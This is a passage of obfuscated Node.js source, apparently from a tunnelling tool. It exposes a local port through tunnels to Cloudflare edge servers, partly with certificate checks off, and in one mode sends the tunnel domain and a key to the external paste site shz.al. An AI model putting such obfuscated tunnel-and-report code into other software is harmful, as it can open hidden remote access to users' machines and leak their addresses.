        } catch (n) {
            b['lgBTm'](d, new Error(b['FOKdR']));
            return;
        }
        if (![
                b[dD(0x76c)],
                b[dD(0x77c)]
            ][dD(0x50f)](g[dD(0x27c)]) || !g[dD(0x5b1)]) {
            d(new Error(b['FOKdR']));
            return;
        }
        const h = b['SwDdc'](g[dD(0x27c)], dD(0x404)), i = g[dD(0x643)] || (h ? 0x1bb : 0x50), j = a0i[dD(0x326)]({
                'host': g['hostname'],
                'port': i
            });
        let k = ![];
        const l = (o, p) => {
                const dE = dD;
                if (k)
                    return;
                k = !![], j[dE(0x1ec)](f['OzYuO'], m), j['setTimeout'](0x0), o(p);
            }, m = o => {
                const dF = dD;
                !k && b[dF(0x674)](l, d, o);
            };
        j['on'](b[dD(0x614)], m), j['setTimeout'](0x7530, () => j[dD(0x79b)](new Error(dD(0x679)))), j['on'](dD(0x326), () => {
            const dH = dD, o = {
                    'dgZdp': function (q, r, s) {
                        const dG = a0b;
                        return b[dG(0x674)](q, r, s);
                    }
                };
            if (!h) {
                b[dH(0x65d)](l, c, j);
                return;
            }
            const p = a0j['connect']({
                'socket': j,
                'servername': g[dH(0x5b1)]
            });
            p['on'](b[dH(0x614)], q => {
                !k && l(d, q);
            }), p['on'](b[dH(0x244)], () => {
                const dI = dH;
                o[dI(0x1df)](l, c, p);
            });
        });
    });
}
function a0ay(a) {
    const dJ = a0aQ, b = {
            'gILJq': function (d, f) {
                return d < f;
            }
        }, c = [];
    for (let d = 0x0; b[dJ(0x847)](d, a[dJ(0x886)]['length']); d += 0x2) {
        c['push']([
            a[dJ(0x886)][d],
            a['rawHeaders'][d + 0x1]
        ]);
    }
    return c;
}
function a0az(a, b, c, d, f) {
    const dK = a0aQ, g = {
            'IucnA': function (h, i) {
                return h(i);
            },
            'PvtHh': function (h, i) {
                return h(i);
            },
            'LRNyB': dK(0x289),
            'wZUqL': dK(0x807),
            'DxLtw': dK(0x404),
            'TrguU': function (h, i) {
                return h === i;
            },
            'JpICa': function (h, i) {
                return h === i;
            },
            'krcWw': dK(0x37c),
            'xwRlm': function (h, i) {
                return h === i;
            },
            'ObIyp': dK(0x57b),
            'KbxAN': 'transfer-encoding',
            'BXOSX': function (h, i) {
                return h === i;
            },
            'KvBRo': dK(0x48b),
            'nlLic': dK(0x3c6),
            'qcsTK': 'Content-Length',
            'UZcPv': function (h, i) {
                return h + i;
            },
            'FAZVt': dK(0x484)
        };
    return new Promise((h, i) => {
        const dL = dK;
        let j;
        try {
            j = new URL(a);
        } catch (q) {
            g[dL(0x6e2)](i, new Error(g[dL(0x5b4)]));
            return;
        }
        if (![
                g[dL(0x214)],
                g[dL(0x332)]
            ][dL(0x50f)](j[dL(0x27c)]) || !j['hostname']) {
            g[dL(0x6e2)](i, new Error(dL(0x289)));
            return;
        }
        const k = g['TrguU'](j['protocol'], g[dL(0x332)]), l = j[dL(0x643)] || (k ? 0x1bb : 0x50), m = {};
        for (const [r, s] of d) {
            const t = r['toLowerCase']();
            if (g[dL(0x885)](t, g[dL(0x759)]) || g['xwRlm'](t, g[dL(0x743)]) || g[dL(0x65f)](t, g['KbxAN']) || g[dL(0x7c4)](t, g['KvBRo']))
                continue;
            m[r] = s;
        }
        m[g[dL(0x2a6)]] = j[dL(0x37c)];
        f[dL(0x32c)] && (m[g[dL(0x417)]] = String(f[dL(0x32c)]));
        const n = c[dL(0x86b)]('/') ? c : g[dL(0x686)]('/', c), o = k ? a0h : a0g, p = o['request']({
                'hostname': j['hostname'],
                'port': l,
                'path': n,
                'method': b,
                'headers': m,
                'timeout': 0x7530
            }, u => {
                const dM = dL;
                g[dM(0x254)](h, {
                    'status': u['statusCode'],
                    'headers': g['PvtHh'](a0ay, u),
                    'body': u
                });
            });
        p['on'](g[dL(0x482)], u => i(u)), p[dL(0x4ef)](f['length'] ? f : undefined);
    });
}
function a0aA(a) {
    const dN = a0aQ, b = {
            'NanHv': dN(0x359),
            'HZooE': function (c, d) {
                return c < d;
            },
            'fhNmv': function (c) {
                return c();
            },
            'FgvWZ': dN(0x225),
            'tRdsV': function (c, d) {
                return c(d);
            },
            'IFdUA': dN(0x6fd),
            'ZZYdV': function (c, d) {
                return c + d;
            },
            'mVjck': dN(0x70b),
            'cTdNb': dN(0x484),
            'dQMaa': dN(0x4ef),
            'NEbuA': dN(0x6af),
            'YVSkF': function (c) {
                return c();
            },
            'jYMgW': dN(0x2b6)
        };
    return new Promise((c, d) => {
        const dO = dN, f = {
                'WlwlI': dO(0x2b6),
                'GmyGg': b[dO(0x543)],
                'RGAWF': b[dO(0x726)],
                'SaIko': b[dO(0x532)],
                'weFqk': function (l) {
                    return b['YVSkF'](l);
                },
                'MZUCl': function (l, m) {
                    return l(m);
                }
            };
        let g = Buffer['alloc'](0x0);
        const h = () => {
                const dP = dO;
                a[dP(0x1ec)](f[dP(0x4b8)], i), a[dP(0x1ec)](f[dP(0x4c3)], j), a[dP(0x1ec)](f[dP(0x79a)], k), a[dP(0x1ec)](f[dP(0x4ca)], k);
            }, i = l => {
                const dQ = dO;
                g = g[dQ(0x32c)] ? Buffer[dQ(0x327)]([
                    g,
                    l
                ]) : l;
                const m = g[dQ(0x300)](b[dQ(0x2d5)]);
                if (b[dQ(0x249)](m, 0x0))
                    return;
                b[dQ(0x4aa)](h);
                const n = g[dQ(0x88a)](0x0, m)[dQ(0x3e8)](b[dQ(0x2f6)]), o = n[dQ(0x281)]('\x0d\x0a'), p = o[0x0][dQ(0x281)]('\x20'), q = parseInt(p[0x1], 0xa);
                if (!Number[dQ(0x322)](q)) {
                    b[dQ(0x72a)](d, new Error(b[dQ(0x768)]));
                    return;
                }
                const r = [];
                for (let s = 0x1; b['HZooE'](s, o[dQ(0x32c)]); s++) {
                    const t = o[s];
                    if (!t)
                        continue;
                    const u = t[dQ(0x300)](':');
                    u > 0x0 && r['push']([
                        t[dQ(0x4a4)](0x0, u)[dQ(0x777)](),
                        t[dQ(0x4a4)](b[dQ(0x77e)](u, 0x1))[dQ(0x777)]()
                    ]);
                }
                b[dQ(0x72a)](c, {
                    'status': q,
                    'headers': r,
                    'rest': g[dQ(0x88a)](m + 0x4)
                });
            }, j = l => {
                const dR = dO;
                f[dR(0x3a9)](h), f[dR(0x571)](d, l);
            }, k = () => {
                const dS = dO;
                b[dS(0x4aa)](h), b[dS(0x72a)](d, new Error(b[dS(0x761)]));
            };
        a['on'](b[dO(0x7d3)], i), a['on'](b[dO(0x543)], j), a['on'](b[dO(0x726)], k), a['on'](b[dO(0x532)], k);
    });
}
function a0aB(a) {
    const dT = a0aQ, b = {
            'QWdlB': dT(0x861),
            'HFPSi': function (f, g) {
                return f === g;
            },
            'NhLau': function (f, g) {
                return f === g;
            },
            'prFtr': dT(0x580),
            'tiGDY': dT(0x314),
            'TZerY': function (f, g) {
                return f + g;
            },
            'kXNep': dT(0x69f),
            'XTWNP': function (f, g) {
                return f(g);
            },
            'RrjkM': dT(0x49f),
            'jtURK': function (f, g) {
                return f + g;
            },
            'OPXJV': 'issuer\x20OU\x20mismatch:\x20',
            'AYKaO': dT(0x5ce),
            'EdTUi': dT(0x54c),
            'tvRqJ': dT(0x222)
        };
    if (!a || !a[dT(0x1fb)])
        return b[dT(0x5a7)];
    if (a['issuer']['O'] !== dT(0x704))
        return b['TZerY'](b[dT(0x7f1)], a[dT(0x1fb)]['O'] || '');
    if (!b[dT(0x2dc)](String, a[dT(0x1fb)]['OU'] || '')['startsWith'](b[dT(0x3ed)]))
        return b[dT(0x2e9)](b[dT(0x4e0)], a['issuer']['OU'] || '');
    if (!a[dT(0x843)] || a[dT(0x843)]['CN'] !== b[dT(0x5e2)])
        return b['EdTUi'];
    const c = b[dT(0x2dc)](String, a[dT(0x7e5)] || '')[dT(0x281)](',')[dT(0x3dc)](f => f[dT(0x777)]()[dT(0x207)]()), d = c['some'](f => {
            const dU = dT;
            if (!f[dU(0x86b)](b['QWdlB']))
                return ![];
            const g = f[dU(0x4a4)](0x4);
            return b[dU(0x423)](g, dU(0x580)) || b[dU(0x509)](g, dU(0x344)) || g[dU(0x86b)]('*.') && b[dU(0x229)]['endsWith'](g[dU(0x4a4)](0x1));
        });
    if (!d)
        return b[dT(0x835)];
    return null;
}
function a0aC(a, b) {
    const dV = a0aQ, c = {
            'LTtuj': function (h, i) {
                return h + i;
            },
            'VPWBZ': dV(0x48e),
            'NzWUK': function (h, i) {
                return h + i;
            },
            'LjOyb': 'connected\x20to\x20',
            'QLahi': function (h, i) {
                return h(i);
            },
            'fOoCC': dV(0x580),
            'rGXQb': dV(0x484),
            'ExkMY': function (h, i) {
                return h + i;
            },
            'cmWHy': 'edge\x20',
            'FwXby': dV(0x3d9),
            'cwxuU': function (h, i) {
                return h + i;
            },
            'rVtsV': 'all\x20Cloudflare\x20edges\x20failed:\x20'
        }, d = a0Z[dV(0x4a4)]()[dV(0x4fb)](() => Math[dV(0x3e9)]() - 0.5);
    let f = null;
    const g = async () => {
        const e1 = dV;
        for (const h of d) {
            try {
                return await new Promise((i, j) => {
                    const dX = a0b, k = {
                            'NHxAK': function (m, n) {
                                const dW = a0b;
                                return c[dW(0x1dd)](m, n);
                            },
                            'MOaiO': c[dX(0x231)],
                            'QyVoQ': function (m, n) {
                                const dY = dX;
                                return c[dY(0x58a)](m, n);
                            },
                            'gbjbD': function (m, n) {
                                return c['NzWUK'](m, n);
                            },
                            'Eoakd': c['LjOyb'],
                            'ApEGW': function (m, n) {
                                const dZ = dX;
                                return c[dZ(0x691)](m, n);
                            }
                        }, l = a0j[dX(0x326)]({
                            'host': h,
                            'port': a0a0,
                            'ALPNProtocols': ['h2'],
                            'servername': c[dX(0x721)],
                            'rejectUnauthorized': ![]
                        });
                    l[dX(0x1e4)](0x2710, () => l[dX(0x79b)](new Error(dX(0x6dd)))), l['on'](c[dX(0x6a6)], j), l['on'](dX(0x3d7), () => {
                        const e0 = dX;
                        if (a) {
                            const n = a0aB(l[e0(0x6ac)](![]));
                            if (n) {
                                l[e0(0x79b)](new Error(k[e0(0x1cb)]('edge\x20certificate\x20verification\x20failed:\x20', n)));
                                return;
                            }
                        }
                        const m = l[e0(0x467)];
                        if (m && m !== 'h2') {
                            l[e0(0x79b)](new Error(k[e0(0x867)]));
                            return;
                        }
                        l['setTimeout'](0x0), b[e0(0x524)](k[e0(0x753)](k[e0(0x1cb)](k[e0(0x690)](k[e0(0x1e5)], h), ':'), a0a0)), k[e0(0x79e)](i, l);
                    });
                });
            } catch (i) {
                f = i, b[e1(0x1d8)](c[e1(0x491)](c[e1(0x58a)](c['cmWHy'], h) + c[e1(0x450)], i));
            }
        }
        throw new Error(c[e1(0x829)](c[e1(0x803)], f));
    };
    return g();
}
const a0aD = 0x2;
function a0aE(a) {
    const e2 = a0aQ, b = {
            'PUTlw': function (c, d) {
                return c === d;
            },
            'cdxRV': e2(0x63e)
        };
    if (b['PUTlw'](typeof a, b[e2(0x4cb)])) {
        const c = a['trim']();
        if (c)
            try {
                return JSON[e2(0x4d7)](c);
            } catch (d) {
            }
        return {};
    }
    return a && b[e2(0x37f)](typeof a, e2(0x6fa)) ? a : {};
}
class a0aF {
    constructor(a) {
        this['log'] = a, this['tunnels'] = new Map();
    }
    async [a0aQ(0x1d4)](a, b) {
        const e3 = a0aQ, c = {
                'IkCTn': function (l, m) {
                    return l > m;
                },
                'cTyPO': function (l, m) {
                    return l(m);
                },
                'SiCKw': e3(0x7ed),
                'oVqKI': function (l, m) {
                    return l + m;
                },
                'nTnLJ': e3(0x68f),
                'DyLPf': 'https://',
                'zCoaB': function (l, m) {
                    return l + m;
                },
                'RQjIy': function (l, m) {
                    return l + m;
                },
                'hgqZT': e3(0x28f),
                'Ayutm': '\x20->\x20127.0.0.1:'
            }, d = this[e3(0x45d)][e3(0x52b)](a) || [];
        if (c[e3(0x713)](d[e3(0x32c)], 0x0) && !b) {
            const l = new Error(e3(0x3f2) + a + e3(0x40b));
            l['status'] = 0x199, l[e3(0x643)] = a;
            throw l;
        }
        let f, g, h, i;
        try {
            [f, g, h, i] = await c[e3(0x6ff)](a0ar, c[e3(0x662)]);
        } catch (m) {
            const n = new Error(c[e3(0x2e1)](c[e3(0x83e)], m[e3(0x346)]));
            n['status'] = 0x1f4, n[e3(0x643)] = a;
            throw n;
        }
        const j = f[e3(0x86b)](c[e3(0x5e9)]) ? f : c[e3(0x24e)](c[e3(0x5e9)], f), k = {
                'tunnelDomain': j,
                'port': a,
                'createdAt': new Date()[e3(0x860)]()['replace'](/\.\d{3}Z$/, 'Z'),
                'stopped': ![],
                'sock': null,
                'runPromise': null
            };
        return k[e3(0x5d3)] = this[e3(0x694)](k, g, h, i)[e3(0x5e7)](o => this[e3(0x6f7)][e3(0x1d8)](e3(0x3c7) + j + e3(0x7b3) + o[e3(0x346)])), d[e3(0x381)](k), this[e3(0x45d)][e3(0x3f0)](a, d), this['log']['info'](c[e3(0x2e1)](c[e3(0x857)](c[e3(0x406)], j) + c['Ayutm'], a)), k;
    }
    [a0aQ(0x3a8)]() {
        const e4 = a0aQ, a = [], b = [...this[e4(0x45d)][e4(0x38a)]()][e4(0x4fb)]((c, d) => c - d);
        for (const c of b) {
            for (const d of this[e4(0x45d)][e4(0x52b)](c)) {
                a[e4(0x381)]({
                    'tunnel_domain': d[e4(0x69c)],
                    'port': d[e4(0x643)],
                    'created_at': d[e4(0x54a)]
                });
            }
        }
        return a;
    }
    async [a0aQ(0x4c8)](a, b) {
        const e5 = a0aQ, c = {
                'TPhCT': function (i, j) {
                    return i === j;
                },
                'RGYep': function (i, j) {
                    return i === j;
                },
                'PHwxB': function (i, j) {
                    return i === j;
                },
                'WhGUi': function (i, j) {
                    return i > j;
                },
                'LrHgf': function (i, j) {
                    return i + j;
                },
                'CmgQt': e5(0x518)
            }, d = this[e5(0x45d)]['get'](a) || [];
        if (c[e5(0x34a)](d['length'], 0x0))
            return {
                'status': 0x194,
                'message': e5(0x7ea) + a
            };
        let f;
        if (c[e5(0x34a)](b, undefined) || c[e5(0x81a)](b, null) || c[e5(0x253)](b, '')) {
            if (d['length'] > 0x1)
                return {
                    'status': 0x199,
                    'message': e5(0x43e) + a + e5(0x1cc)
                };
            f = d;
        } else {
            f = d[e5(0x4c7)](i => i['tunnelDomain'] === b);
            if (f[e5(0x32c)] === 0x0)
                return {
                    'status': 0x194,
                    'message': e5(0x7ea) + a + e5(0x480) + b
                };
        }
        const g = [];
        for (const i of f) {
            i[e5(0x4ad)] = !![];
            if (i[e5(0x66e)] !== null)
                try {
                    i[e5(0x66e)][e5(0x79b)]();
                } catch (j) {
                }
            await i[e5(0x5d3)][e5(0x5e7)](() => {
            }), g[e5(0x381)]({
                'tunnel_domain': i[e5(0x69c)],
                'port': i[e5(0x643)],
                'created_at': i['createdAt']
            });
        }
        const h = d[e5(0x4c7)](k => !k[e5(0x4ad)]);
        c['WhGUi'](h[e5(0x32c)], 0x0) ? this[e5(0x45d)][e5(0x3f0)](a, h) : this['tunnels']['delete'](a);
        for (const k of g) {
            this[e5(0x6f7)][e5(0x524)](c[e5(0x567)](c[e5(0x1d3)], k[e5(0x69d)]));
        }
        return {
            'status': 'ok',
            'deleted': g[e5(0x32c)],
            'tunnels': g
        };
    }
    async [a0aQ(0x694)](a, b, c, d) {
        const e6 = a0aQ, f = {
                'kLIug': e6(0x758),
                'ZYUlU': function (h, i) {
                    return h !== i;
                },
                'nmGjS': function (h, i) {
                    return h(i);
                },
                'uviol': e6(0x27d),
                'gLIll': function (h, i, j) {
                    return h(i, j);
                },
                'qWwKn': function (h, i) {
                    return h + i;
                },
                'UIztE': function (h, i) {
                    return h + i;
                },
                'Hlxfp': function (h, i) {
                    return h + i;
                },
                'TKCEi': e6(0x2ca)
            }, g = f[e6(0x7a7)] + a[e6(0x643)];
        while (!a['stopped']) {
            let h = null;
            try {
                const i = f[e6(0x56a)](f[e6(0x616)](String, process.env.KISAMA_EDGE_INSECURE || '')[e6(0x207)](), f[e6(0x23d)]);
                h = await f[e6(0x487)](a0aC, i, this[e6(0x6f7)]);
                if (a[e6(0x4ad)]) {
                    try {
                        h[e6(0x79b)]();
                    } catch (j) {
                    }
                    break;
                }
                a[e6(0x66e)] = h, await new a0au(h, g, b, c, d, 0x0, this['log'], a['tunnelDomain'], ![], { 'printed': !![] })['run']();
            } catch (k) {
                !a[e6(0x4ad)] && this[e6(0x6f7)][e6(0x1d8)](f[e6(0x596)](f['UIztE'](f[e6(0x265)](f[e6(0x331)], a[e6(0x69c)]), e6(0x898)), k['message']));
            } finally {
                if (f[e6(0x56a)](h, null))
                    try {
                        h[e6(0x79b)]();
                    } catch (l) {
                    }
                a['sock'] = null;
            }
            !a[e6(0x4ad)] && await new Promise(m => setTimeout(m, a0aD * 0x3e8));
        }
    }
}
class a0aG {
    static [a0aQ(0x83c)] = ![];
    static ['_domain'] = null;
    static [a0aQ(0x523)] = /^[A-Za-z0-9+_\-*$=@,;[/\]]+$/;
    static [a0aQ(0x6d9)] = ![];
    static [a0aQ(0x22e)]() {
        const e7 = a0aQ, a = {
                'PhFgB': function (g, h) {
                    return g < h;
                },
                'PRCIZ': e7(0x372),
                'BznrV': function (g, h) {
                    return g < h;
                },
                'JwFst': 'KNAME_KEY',
                'vWSJP': function (g, h) {
                    return g || h;
                },
                'gPQmr': '(未设置)',
                'MNhjr': e7(0x3b6),
                'pqOym': e7(0x40a)
            }, b = a0O[e7(0x84e)] || '', c = a0O[e7(0x875)] || a0O[e7(0x84e)] || '', d = [];
        if (a[e7(0x7fc)](b[e7(0x32c)], 0x3))
            d[e7(0x381)](e7(0x745) + b[e7(0x32c)] + e7(0x3f9));
        if (!this[e7(0x523)][e7(0x5b3)](b))
            d['push'](a[e7(0x7c0)]);
        if (a[e7(0x3cc)](c[e7(0x32c)], 0x8))
            d[e7(0x381)](e7(0x640) + c['length'] + e7(0x865) + (a0O[e7(0x875)] ? a[e7(0x599)] : 'KNAME') + ')');
        const f = d[e7(0x32c)] === 0x0;
        return !f && !this[e7(0x6d9)] && (this[e7(0x6d9)] = !![], a0C[e7(0x524)]('[KMODE]\x20⚠️\x20KMODE=2\x20未生效,\x20条件不满足:\x20' + d['join'](';\x20') + e7(0x58b) + a[e7(0x6c0)](b, a[e7(0x51c)]) + ',\x20KNAME_KEY=' + (a0O['KNAME_KEY'] || a[e7(0x6c6)]) + ')'), a0C[e7(0x524)](a[e7(0x44c)])), f;
    }
    static ['reportShzalDebug']() {
        const e8 = a0aQ, a = {
                'vEUZY': function (b, c) {
                    return b === c;
                },
                'WiETl': function (b, c) {
                    return b(c);
                },
                'XwrPJ': e8(0x27d)
            };
        return a0O[e8(0x590)] || a['vEUZY'](a['WiETl'](String, process.env.SHZAL_DEBUG || '')[e8(0x207)](), a['XwrPJ']);
    }
    static [a0aQ(0x263)](a) {
        const e9 = a0aQ, b = {
                'ewqrp': function (f, g) {
                    return f(g);
                },
                'SZuJG': function (f, g) {
                    return f + g;
                },
                'ZuzxY': e9(0x2b3),
                'XKHHX': e9(0x484),
                'nRqYF': 'PUT\x20覆盖状态:\x20',
                'VFSEq': '\x20(成功)',
                'CodvO': function (f) {
                    return f();
                },
                'vYgdD': 'POST\x20https://shz.al/\x20状态:\x20',
                'ctqSh': e9(0x21a),
                'FbIOC': e9(0x881),
                'ucSBq': function (f, g) {
                    return f === g;
                },
                'iYwYU': '上报成功',
                'OgPVz': function (f) {
                    return f();
                },
                'pCast': function (f, g) {
                    return f + g;
                },
                'EeKFs': e9(0x574),
                'mbvDN': e9(0x21d),
                'cFmDO': e9(0x85c),
                'ZUFbe': e9(0x347),
                'YnrpZ': function (f, g) {
                    return f(g);
                },
                'JScxW': function (f, g) {
                    return f + g;
                },
                'jlYEO': e9(0x600),
                'ZWjRX': e9(0x6e8),
                'FQbxh': function (f, g) {
                    return f > g;
                },
                'qfGfp': function (f, g, h, i, j) {
                    return f(g, h, i, j);
                },
                'lxxbk': 'https://shz.al/',
                'hkKVw': e9(0x208),
                'fxRCE': function (f, g) {
                    return f + g;
                },
                'XeBXS': e9(0x49a)
            }, c = this[e9(0x6b0)](), d = f => {
                const ea = e9;
                if (c)
                    a0C[ea(0x4b3)](ea(0x628) + f);
            };
        return new Promise(f => {
            const ed = e9, g = {
                    'BLLFn': function (n, o) {
                        const eb = a0b;
                        return b[eb(0x28b)](n, o);
                    },
                    'FtEnK': function (n, o) {
                        return b['SZuJG'](n, o);
                    },
                    'VQBaq': function (n, o) {
                        const ec = a0b;
                        return b[ec(0x25f)](n, o);
                    },
                    'uOlkX': function (n, o) {
                        return n + o;
                    },
                    'NutRk': b[ed(0x764)],
                    'XSIsN': ed(0x290),
                    'OHrXJ': b[ed(0x80b)],
                    'eVxsh': b[ed(0x2f1)],
                    'AwlwV': b[ed(0x593)],
                    'xmjXc': function (n) {
                        const ee = ed;
                        return b[ee(0x2da)](n);
                    },
                    'UBIgY': function (n, o) {
                        return n + o;
                    },
                    'znSNw': b['vYgdD'],
                    'SsOVI': function (n, o) {
                        return n + o;
                    },
                    'YwrDZ': b['ctqSh'],
                    'SwJVI': function (n, o, p, q, r) {
                        return n(o, p, q, r);
                    },
                    'dPqOY': b['FbIOC'],
                    'iwQlM': function (n, o) {
                        return b['ucSBq'](n, o);
                    },
                    'oYELU': b[ed(0x440)],
                    'cKLnF': function (n) {
                        return b['OgPVz'](n);
                    },
                    'gfNxH': function (n, o) {
                        const ef = ed;
                        return b[ef(0x28b)](n, o);
                    },
                    'jfMrw': function (n, o) {
                        return b['SZuJG'](n, o);
                    },
                    'ocNwK': function (n, o) {
                        const eg = ed;
                        return b[eg(0x4e7)](n, o);
                    },
                    'UGZmR': b[ed(0x68c)],
                    'hBQUt': b[ed(0x52a)]
                }, h = a0O[ed(0x84e)], i = a0O[ed(0x875)] || a0O[ed(0x84e)], j = b[ed(0x2be)] + a0k[ed(0x1e7)](0xc)[ed(0x3e8)](b['ZUFbe']), k = [
                    [
                        'c',
                        a
                    ],
                    [
                        'n',
                        h
                    ],
                    [
                        's',
                        i
                    ],
                    [
                        'e',
                        '7d'
                    ]
                ], l = n => {
                    const eh = ed, o = n[eh(0x3dc)](([p, q]) => Buffer[eh(0x45b)]('--' + j + eh(0x389) + p + eh(0x458) + q + '\x0d\x0a'));
                    return o[eh(0x381)](Buffer['from']('--' + j + eh(0x373))), Buffer[eh(0x327)](o);
                }, m = (n, o, p, q) => {
                    const el = ed, r = {
                            'JpELx': function (v, w) {
                                const ei = a0b;
                                return g[ei(0x6bc)](v, w);
                            },
                            'gzaAG': function (v, w) {
                                const ej = a0b;
                                return g[ej(0x7dc)](v, w);
                            },
                            'oMcAU': function (v, w) {
                                const ek = a0b;
                                return g[ek(0x695)](v, w);
                            },
                            'POupG': function (v, w) {
                                return g['uOlkX'](v, w);
                            },
                            'otQmd': g[el(0x680)],
                            'lDRuD': function (v, w) {
                                return g['BLLFn'](v, w);
                            }
                        }, s = new URL(n), t = a0h[el(0x719)]({
                            'hostname': s[el(0x5b1)],
                            'port': s[el(0x643)] || 0x1bb,
                            'path': s[el(0x5ae)] + s[el(0x698)],
                            'method': p,
                            'headers': {
                                'Content-Type': 'multipart/form-data;\x20boundary=' + j,
                                'Content-Length': o ? o[el(0x32c)] : 0x0,
                                'User-Agent': g[el(0x4d3)]
                            }
                        }, v => {
                            const em = el;
                            v['resume'](), v['on'](em(0x4ef), () => q(v['statusCode']));
                        });
                    t['on'](g[el(0x32b)], v => {
                        const en = el;
                        r[en(0x3a7)](d, r[en(0x383)](r[en(0x383)](r[en(0x3f7)](r[en(0x2ce)](p, '\x20'), n), r[en(0x1d7)]), v[en(0x346)])), r[en(0x3fd)](q, 0x0);
                    });
                    if (o)
                        t[el(0x1c7)](o);
                    t[el(0x4ef)]();
                };
            b[ed(0x738)](d, b[ed(0x4e7)](b[ed(0x25f)](b[ed(0x35a)](b[ed(0x215)] + h, b['ZWjRX']), b[ed(0x4c9)](i[ed(0x32c)], 0x0)), ')'));
            try {
                b[ed(0x42e)](m, b[ed(0x547)], b['YnrpZ'](l, k), b['hkKVw'], n => {
                    const eo = ed, o = {
                            'UYlPm': function (p, q) {
                                return p + q;
                            },
                            'XLlUM': g[eo(0x4af)],
                            'IKGRD': g['AwlwV'],
                            'GfDOH': '\x20(失败)',
                            'jfbUi': function (p) {
                                const ep = eo;
                                return g[ep(0x292)](p);
                            }
                        };
                    d(g[eo(0x306)](g[eo(0x6f9)], n));
                    if (n === 0x199) {
                        d(g[eo(0x465)](g[eo(0x45f)] + h, ':*'));
                        const p = k['filter'](([q]) => q !== 'n');
                        g[eo(0x44d)](m, eo(0x25d) + h + ':' + i, g['BLLFn'](l, p), g[eo(0x3b2)], q => {
                            const eq = eo;
                            d(o[eq(0x82b)](o[eq(0x464)], q) + (q === 0xc8 ? o[eq(0x75a)] : o[eq(0x751)])), o[eq(0x44e)](f);
                        });
                    } else
                        g[eo(0x387)](n, 0xc8) ? (g[eo(0x6bc)](d, g[eo(0x7f0)]), g[eo(0x53d)](f)) : (g[eo(0x431)](d, g[eo(0x392)](g[eo(0x33e)](g[eo(0x206)], n), g[eo(0x5c8)])), f());
                });
            } catch (n) {
                b['ewqrp'](d, b['fxRCE'](b[ed(0x6bf)], n[ed(0x346)])), f();
            }
        })[e9(0x510)](() => {
            const er = e9;
            this[er(0x34c)] = a;
        })[e9(0x5e7)](() => {
        });
    }
    static [a0aQ(0x817)]() {
        const es = a0aQ, a = [
                process.env.USERPROFILE,
                process.env.HOME
            ];
        for (const b of a) {
            if (b && a0l[es(0x235)](b) && a0l['statSync'](b)['isDirectory']())
                return b;
        }
        try {
            return a0o['homedir']();
        } catch (c) {
            return process[es(0x634)]();
        }
    }
    static [a0aQ(0x4ea)]() {
        const et = a0aQ, a = {
                'Mgeon': et(0x508),
                'rlwuI': et(0x255),
                'nGAAe': function (c, d) {
                    return c > d;
                }
            };
        let b = (a0O[et(0x4fa)] || '')[et(0x777)]();
        if (!b)
            return a0n[et(0x48d)](this[et(0x817)](), a[et(0x2fb)]);
        if (b[et(0x86b)](a[et(0x370)]))
            b = a[et(0x6e7)](b[et(0x32c)], 0x5) ? a0n['join'](this[et(0x817)](), b[et(0x4a4)](0x5)[et(0x538)](/^[/\\]+/, '')) : this['homeDir']();
        else
            b['startsWith']('~') && (b = a0n[et(0x26a)](b[et(0x538)](/^~(?=[/\\]|$)/, this['homeDir']())));
        return b;
    }
    static ['writeDomainFile'](a) {
        const eu = a0aQ;
        this['_domain'] = a;
        const b = this[eu(0x4ea)]();
        try {
            a0l[eu(0x354)](a0n[eu(0x7c9)](a0n['resolve'](b)), { 'recursive': !![] }), a0l['writeFileSync'](b, a), a0C[eu(0x524)](eu(0x741) + b);
        } catch (c) {
            a0C[eu(0x82d)](eu(0x21e) + b + eu(0x7a6) + c[eu(0x346)]);
        }
    }
    static [a0aQ(0x884)]() {
        const ev = a0aQ, a = this['resolveDomainFilePath']();
        try {
            a0l['existsSync'](a) && a0l['statSync'](a)[ev(0x5b5)]() && (a0l[ev(0x1fe)](a), a0C[ev(0x524)]('[KMODE]\x20🗑️\x20域名文件已删除:\x20' + a));
        } catch (b) {
            a0C[ev(0x82d)](ev(0x429) + a + '):\x20' + b[ev(0x346)]);
        }
    }
    static [a0aQ(0x59c)]() {
        const ew = a0aQ;
        !this[ew(0x83c)] && (this[ew(0x83c)] = !![], this[ew(0x884)]());
    }
    static [a0aQ(0x313)]() {
        const ex = a0aQ, a = {
                'JxqFy': function (b, c) {
                    return b === c;
                },
                'WfyVH': ex(0x5fd),
                'zCznB': ex(0x649),
                'pAmoe': ex(0x893),
                'Sykgr': 'close',
                'gTLBG': ex(0x484)
            };
        try {
            const b = a0p[ex(0x872)]({
                'input': process[ex(0x64c)],
                'terminal': ![]
            });
            b['on'](a[ex(0x51b)], c => {
                const ey = ex;
                a[ey(0x489)](c['trim'](), a[ey(0x4b0)]) && console[ey(0x6f7)](this[ey(0x34c)] || a[ey(0x31d)]);
            }), b['on'](a[ex(0x445)], () => {
            }), b['on'](a[ex(0x775)], () => {
            });
        } catch (c) {
        }
    }
    static [a0aQ(0x6a7)](a) {
        const ez = a0aQ, b = {
                'QfkNy': function (c, d) {
                    return c === d;
                }
            };
        if (b['QfkNy'](a0O[ez(0x61a)], '2') && this[ez(0x22e)]()) {
            a0C[ez(0x524)]('[KMODE]\x20🚀\x20KMODE=2:\x20隧道域名将上报至外部平台'), a[ez(0x1d4)](a0O[ez(0x569)])['then'](c => this[ez(0x263)](c['tunnelDomain']))[ez(0x5e7)](() => {
            });
            return;
        }
        a0C[ez(0x524)]('[KMODE]\x20🚀\x20KMODE=1:\x20启动时自动创建临时隧道'), a[ez(0x1d4)](a0O[ez(0x569)])[ez(0x510)](c => {
            const eA = ez;
            this[eA(0x48c)](c[eA(0x69c)]);
        })[ez(0x5e7)](c => {
            const eB = ez;
            a0C['warn'](eB(0x605) + c[eB(0x346)]);
        }), this['startStdinListener']();
    }
}
let a0aH = null, a0aI = null;
const a0aJ = new Promise((a, b) => {
    const eC = a0aQ, c = {
            'xnQFU': eC(0x808),
            'puEgE': function (d) {
                return d();
            },
            'gVhfa': 'Noise\x20WASM\x20module\x20loaded\x20successfully',
            'ecZjs': function (d, f) {
                return d(f);
            },
            'gyJuH': '[WARN]\x20Exception\x20loading\x20Noise\x20module:',
            'wFRfo': function (d) {
                return d();
            }
        };
    try {
        c[eC(0x791)](a0x, function (d) {
            const eD = eC;
            if (!d) {
                a0aI = new Error(eD(0x838)), a0C[eD(0x82d)](c[eD(0x463)], a0aI[eD(0x346)]), c[eD(0x298)](a);
                return;
            }
            a0aH = d, a0C[eD(0x4b3)](c[eD(0x4e6)]), a();
        });
    } catch (d) {
